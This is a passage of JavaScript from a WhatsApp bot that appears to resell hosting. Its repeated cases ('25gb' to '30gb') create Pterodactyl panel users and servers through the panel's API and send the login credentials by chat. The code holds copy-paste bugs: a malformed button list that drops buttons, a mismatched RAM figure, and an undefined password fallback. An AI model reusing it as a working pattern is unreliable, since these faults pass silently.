let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "24100"
let cpu = "720"
let disk = "24100"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 24100
│ • DISK : 24100
│ • CPU : 720%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 22100
│ • *DISK :* 22100
│ • *CPU :* 720%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "25gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "25100"
let cpu = "750"
let disk = "25100"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 25100
│ • DISK : 25100
│ • CPU : 750%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 25100
│ • *DISK :* 25100
│ • *CPU :* 750%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break




case "26gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "26100"
let cpu = "780"
let disk = "26100"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 26100
│ • DISK : 26100
│ • CPU : 780%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 26100
│ • *DISK :* 26100
│ • *CPU :* 780%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break




case "27gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "27100"
let cpu = "810"
let disk = "27100"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 27100
│ • DISK : 27100
│ • CPU : 810%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 27100
│ • *DISK :* 27100
│ • *CPU :* 810%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break






case "28gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "28100"
let cpu = "840"
let disk = "28100"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 28100
│ • DISK : 28100
│ • CPU : 840%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 28100
│ • *DISK :* 28100
│ • *CPU :* 840%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break




case "29gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "29100"
let cpu = "870"
let disk = "29100"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 29100
│ • DISK : 29100
│ • CPU : 870%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 29100
│ • *DISK :* 29100
│ • *CPU :* 870%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break






case "30gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "30150"
let cpu = "900"
let disk = "30150"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 30150
│ • DISK : 30150
│ • CPU : 900%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
